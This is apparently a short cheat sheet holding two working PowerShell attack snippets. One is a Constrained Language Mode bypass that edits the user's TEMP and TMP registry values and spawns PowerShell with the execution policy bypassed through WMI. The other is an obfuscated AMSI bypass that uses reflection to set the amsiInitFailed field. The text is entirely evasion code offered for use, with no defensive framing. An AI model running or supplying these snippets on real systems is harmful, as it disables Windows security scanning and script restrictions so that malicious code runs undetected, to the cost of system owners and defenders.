Powershell CLM Bypass:
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe  -ExecutionPolicy bypass"
sleep 5
#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp

Powershell Obfuscated AMSI Bypass:
$w='System.Management.Automation.A';$c='si';$m='Utils'
$assembly=[Ref].Assembly.GetType(('{0}m{1}{2}'-f$w,$c,$m))
$field=$assembly.GetField(('am{0}InitFailed'-f$c),'NonPublic,Static')
$field.SetValue($null,$true)

